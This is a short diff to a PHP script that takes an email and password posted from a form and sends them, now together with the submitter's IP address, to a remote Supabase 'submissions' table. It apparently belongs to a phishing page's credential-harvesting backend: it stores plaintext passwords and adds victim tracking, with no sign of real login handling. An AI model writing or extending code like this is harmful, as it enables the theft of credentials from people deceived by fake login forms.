@@ -3,12 +3,14 @@ session_start();
 
 $email = $_POST['email'];
 $password = $_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
 
 $url = "https://ptshthtnjcbngiceyjzc.supabase.co/rest/v1/submissions";
 
 $data = array(
     "email" => $email,
-    "password" => $password
+    "password" => $password,
+    "ip_address" => $ip
 );
 
 $payload = json_encode($data);
